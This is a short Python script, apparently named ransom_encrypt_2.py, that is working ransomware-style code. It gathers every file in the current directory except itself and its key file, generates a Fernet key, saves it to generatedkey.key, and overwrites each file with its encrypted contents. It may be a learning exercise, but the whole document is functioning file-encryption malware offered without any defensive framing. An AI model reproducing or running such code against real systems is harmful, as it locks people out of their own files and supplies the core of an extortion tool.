import os
from cryptography.fernet import Fernet

file_list = []

for file in os.listdir():
    if file == "ransom_encrypt_2.py" or file == "generatedkey.key":
        continue
    if os.path.isfile(file):
        file_list.append(file)

print(file_list)

key = Fernet.generate_key()

print(key)

with open("generatedkey.key", "wb") as generatedkey: 
    generatedkey.write(key)    
for file in file_list:
    with open(file, "rb") as the_file:
        contents = the_file.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as the_file:
        the_file.write(contents_encrypted)

